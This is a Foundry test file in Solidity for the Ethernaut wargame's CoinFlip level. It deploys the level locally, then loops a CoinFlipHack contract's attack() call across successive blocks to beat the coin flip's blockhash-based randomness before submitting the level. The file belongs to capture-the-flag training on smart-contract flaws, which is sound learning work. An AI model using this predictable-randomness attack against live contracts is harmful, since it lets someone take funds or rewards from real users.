pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/levels/03_CoinFlip/CoinFlipHack.sol";
import "../src/levels/03_CoinFlip/CoinFlipFactory.sol";
import "../src/core/Ethernaut.sol";
import "./utils/vm.sol";
import "forge-std/console.sol";


contract CoinFlipTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address attacker = address(100);
    

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(attacker, 5 ether);
    }

    function testCoinflipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        CoinFlipFactory coinflipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinflipFactory);
        // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(coinflipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
 
        // Move the block from 0 to 5 to prevent underflow errors
        vm.roll(5);

        // Create coinFlipHack contract
        CoinFlipHack coinFlipHack = new CoinFlipHack(levelAddress);

        // Run the attack 10 times, iterate the block each time, function can only be called once per block
        for (uint i = 0; i <= 10; i++) { 
            // Must be on latest version of foundry - blockhash was defaulting to 0 in earlier version of foundry resolved in this commit https://github.com/gakonst/foundry/pull/728
            vm.roll(6 + i);
            coinFlipHack.attack();        
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
